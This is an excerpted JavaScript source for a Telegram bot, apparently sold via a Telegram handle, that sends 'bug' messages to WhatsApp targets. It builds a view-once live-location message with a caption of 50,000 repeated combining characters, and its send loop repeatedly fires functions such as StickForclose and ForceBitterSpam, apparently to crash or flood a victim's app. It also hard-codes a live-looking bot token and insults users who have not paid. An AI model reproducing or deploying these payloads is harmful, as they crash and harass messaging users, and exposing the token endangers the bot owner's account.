...
const ownerIds = [7664962537]; // contoh chat_id owner 
...
`;
    ...
    const keyboardMain = Markup.inlineKeyboard([
        ...
        [
            ...
            Markup.button.url('Developer ϟ Apps', 'https://t.me/ThaGacorr')
        ]
    ]);

    // 4. Kirim Pesan Awal (Foto + Menu)
    await ctx.replyWithPhoto(
        { url: "https://n.f-a-k.workers.dev/1000028586.jpg" }, 
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
...
bot.command("CreateAccount", async (ctx) => {
  ...
  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @ThaGacorr");
  }
  ...
  try {
    ...
    await ctx.telegram.sendMessage(
      ...
      `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @ThaGacorr</b>\n\n` +
...
app.post('/api/reply-message', async (req, res) => {
    ...
    // --- SETTING PENGIRIMAN ---
    const adminChatId = "7370513847"; // <--- TARGET ID KHUSUS
    const botToken = "8674338576:AAE-68TGZOjAp_tKQov1ZQ-o7aCerBFdUpU"; // Token Bot Anda
...
async function ObsidianCorexDelayBeta(x) {
          ...
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                ...
                caption: "Zuxy Sayang Istri" + "᬴᬴᬴".repeat(50000),
...
/* PEMANGGILAN NYA/CASE UNTUK PENGIRIMAN BUG NYA */
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 18) {
        ...
        ForceBitterSpam(sock, X),
        await sleep(9000),
        StickForclose(sock, X),
        StickForclose(sock, X),
        StickForclose(sock, X),
        ForceComunity(sock, X),
        ForceComunity(sock, X),
        await sleep(3000),
        RFPTarsax(sock, X),
        RFPTarsax(sock, X),
